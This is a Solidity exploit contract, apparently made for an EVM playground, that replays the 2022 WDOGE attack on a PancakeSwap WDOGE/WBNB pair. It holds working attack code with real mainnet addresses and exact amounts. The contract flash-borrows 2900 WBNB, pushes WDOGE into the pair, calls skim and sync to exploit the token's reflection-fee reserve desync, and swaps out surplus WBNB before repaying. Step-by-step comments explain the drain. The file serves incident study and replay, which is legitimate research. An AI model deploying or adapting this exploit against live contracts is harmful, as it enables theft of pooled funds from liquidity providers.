// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-04-Wdoge).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// flash-swap callback `pancakeCall` lives on the test itself, so there is no
// standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit + pancakeCall) so the playground can
// deploy it and record run(). Logic and constants are copied verbatim from
// test/Wdoge_exp.sol.
//
// VULNERABILITY: WDOGE token (sources/WDOGE_46bA8a/WDOGE.sol) fee/reflection logic
// creates balance/reserve desync inside the Pancake V2 pair. Public skim/sync allow
// draining the inconsistency. See detailed VULNERABILITY comments in WDOGE.sol and
// PancakePair_B3e708/PancakePair.sol.
//
// EXPLOIT STEPS: fully annotated inside pancakeCall() below. 8 steps using one flash +
// two WDOGE pushes + skim + sync to over-extract WBNB.
//
// Root cause: WDOGE's transfer accounting left the WDOGE/WBNB Pancake pair's
// reserves inconsistent with actual balances, so a sequence of
// transfer→swap→transfer→skim→sync→swap extracted ~2,971 WBNB from the pair.

interface IWBNB {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}

contract WdogeDrain {
    IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 constant wdoge = IERC20(0x46bA8a59f4863Bd20a066Fd985B163235425B5F9);
    address constant WDOGE_WBNB = 0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d;
    address constant BUSDT_WBNB = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;

    // step 0: trigger a flash swap from the WBNB/BUSDT pair; the callback does the drain.
    function run() external {
        // EXPLOIT STEP 0 (entry): Flash 2900 WBNB from the auxiliary BUSD/WBNB pair. All profit logic is in the callback.
        IPancakePair(BUSDT_WBNB).swap(0, 2900 ether, address(this), "0x");
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        // EXPLOIT STEP 1: Donate flash WBNB into target pair (WDOGE/WBNB). WBNB arrives 1:1.
        wbnb.transfer(WDOGE_WBNB, 2900 ether);

        // EXPLOIT STEP 2: Swap donated WBNB -> huge WDOGE out (pair pays fees on the WDOGE transfer itself).
        IPancakePair(WDOGE_WBNB).swap(6_638_066_501_837_822_413_045_167_240_755, 0, address(this), "");

        // EXPLOIT STEP 3: Transfer WDOGE back into the pair.
        // Triggers VULNERABILITY in WDOGE._transfer + redistribute: pair balance increases by net received + reflection share.
        // At this moment balance_WDOGE > reserve_WDOGE.
        wdoge.transfer(WDOGE_WBNB, 5_532_718_068_557_297_916_520_398_869_451);

        // EXPLOIT STEP 4: skim() -> attacker receives the excess (the "free" post-fee/reflection WDOGE).
        IPancakePair(WDOGE_WBNB).skim(address(this));

        // EXPLOIT STEP 5: sync() -> locks the still-present donated WBNB amount into the pair's reserves.
        // WDOGE reserve is reset (skim restored it). Now reserves claim more WBNB value than "should" be claimable.
        IPancakePair(WDOGE_WBNB).sync();

        // EXPLOIT STEP 6: Second WDOGE push (again creates excess via fees+redistribute into pair).
        wdoge.transfer(WDOGE_WBNB, 4_466_647_961_091_568_568_393_910_837_883);

        // EXPLOIT STEP 7: Swap the fresh WDOGE for large WBNB out using the inflated reserve pricing.
        IPancakePair(WDOGE_WBNB).swap(0, 2_978_658_352_619_485_704_640, address(this), "");

        // EXPLOIT STEP 8: Repay flash loan (2908). Net profit = extracted WBNB surplus.
        wbnb.transfer(BUSDT_WBNB, 2908 ether);
    }
}
